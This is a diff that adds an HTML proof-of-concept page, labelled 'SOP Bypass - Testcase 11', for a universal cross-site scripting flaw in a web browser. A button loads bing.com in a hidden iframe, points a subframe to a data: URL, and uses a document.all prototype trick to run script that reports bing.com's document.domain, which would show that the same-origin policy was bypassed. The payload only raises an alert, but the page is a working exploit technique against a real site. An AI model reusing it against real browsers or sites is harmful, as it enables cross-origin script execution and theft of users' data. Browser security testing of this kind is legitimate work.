@@ -1,0 +1,90 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+<script>
+
+function myfunc2(){
+ frame = document.body.appendChild(document.createElement("iframe"));
+    frame.src = "https://www.bing.com";
+	frame.width = "0px";
+	frame.height = "0px";
+
+
+    frame.onload = function() {
+        frame.onload = null;
+
+        frame.contentWindow[0].location = "data:text/html,<script>(" + function() {
+            window.name = "alert";
+            obj = document.all;
+            obj.__proto__ = parent;
+            alert(obj.alert.constructor("return document.domain")());
+        } + ")()</scr" + "ipt>";
+    }
+}
+</script>
+
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 11</h3>	
+
+		<div class="main">
+				<p></p>
+		</div>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="myfunc2()" /></center>
+
+		
+		</br></br>
+			<div class="note">
+			
+				<p><strong>Note:</strong> <br />
+If document.domain points to bing.com, it has resulted in a SOP Bypass</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
